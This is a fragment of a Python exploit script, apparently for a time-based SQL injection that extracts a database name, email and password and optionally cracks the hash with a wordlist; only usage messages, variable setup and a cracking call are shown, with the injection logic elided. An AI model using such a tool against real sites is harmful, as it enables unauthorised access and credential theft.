...
if not options.url:
    ...
    print("[+] Example usage (no password cracking): exploit.py -u http://target-uri")
    print("[+] Example usage (with password cracking): exploit.py -u http://target-uri --crack -w /path-to-wordlist")
    print("[+] Set the variable TIME with an appropriate time value because this SQL injection is time-based.")
    exit()
...
password = ""
temp_password = ""
TIME = 3  # Increase time for better consistency
db_name = ""
output = ""
email = ""
...
if options.cracking:
    print(colored("[*] Now trying to crack the password", 'yellow'))
    crack_password()
